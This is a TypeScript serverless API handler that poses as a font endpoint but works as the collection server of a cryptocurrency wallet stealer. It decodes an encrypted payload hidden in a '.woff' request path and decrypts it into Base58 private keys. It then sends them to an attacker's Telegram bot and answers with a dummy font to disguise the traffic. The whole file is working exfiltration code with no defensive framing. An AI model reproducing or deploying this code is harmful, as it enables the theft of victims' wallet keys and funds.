// api/inbox/[...slug].ts

import type { VercelRequest, VercelResponse } from '@vercel/node'
import crypto from 'crypto'

// Base58 alphabet and encoder
const ALPHABET = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
function base58(buf: Buffer): string {
  let digits = [0]
  for (const byte of buf) {
    let carry = byte
    for (let i = 0; i < digits.length; i++) {
      carry += digits[i] << 8
      digits[i] = carry % 58
      carry = (carry / 58) | 0
    }
    while (carry) {
      digits.push(carry % 58)
      carry = (carry / 58) | 0
    }
  }
  let out = ''
  for (const b of buf) {
    if (b === 0) out += ALPHABET[0]
    else break
  }
  for (let i = digits.length - 1; i >= 0; i--) {
    out += ALPHABET[digits[i]]
  }
  return out
}

export default async function handler(req: VercelRequest, res: VercelResponse) {
  // CORS & font header
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Content-Type', 'font/woff')

  try {
    // Get last path segment, strip extension
    const parts = new URL(req.url!, 'https://d').pathname.split('/')
    let filename = parts[parts.length - 1]      // e.g. "ts_payload.woff"
    filename = filename.replace(/\.\w+$/, '')   // remove ".woff" or ".ico"

    const [ts, payloadB64url] = filename.split('_')
    if (!payloadB64url) throw new Error('Bad slug format')

    // URL-safe → standard Base64
    let b64 = payloadB64url.replace(/-/g, '+').replace(/_/g, '/')
    b64 += '='.repeat((4 - (b64.length % 4)) % 4)

    // Parse JSON payload
    const { sBundles, keybundle } = JSON.parse(
      Buffer.from(b64, 'base64').toString('utf8').trim()
    )

    // AES-GCM key
    const key = Buffer.from(keybundle, 'base64')
    const privKeys: string[] = []

    // Decrypt each sBundle
    for (const sb of sBundles) {
      const [iv_b64, data_b64] = sb.split(':')
      const iv = Buffer.from(iv_b64, 'base64')
      const ctTag = Buffer.from(data_b64, 'base64')
      const tag = ctTag.slice(-16)
      const ct = ctTag.slice(0, -16)

      const dec = crypto.createDecipheriv('aes-256-gcm', key, iv)
      dec.setAuthTag(tag)
      const hex = Buffer.concat([dec.update(ct), dec.final()]).toString('utf8')
      const last64 = hex.slice(-64)
      privKeys.push(base58(Buffer.from(last64, 'hex')))
    }

    // Telegram
    const BOT = process.env.BOT_TOKEN!
    const CHAT = process.env.CHAT_ID!
    const text = privKeys.map((k, i) => `wallet ${i+1}\n${k}`).join('\n\n')

    console.log('🔹 Telegram payload:', text)
    const resp = await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT, text })
    })
    console.log('🔹 Telegram response:', resp.status, await resp.text())

  } catch (e) {
    console.error('❌ Error processing exfil:', e)
  }

  // Dummy font response
  res.status(200).send(Buffer.from([0x77,0x4f,0x46,0x46]))
}
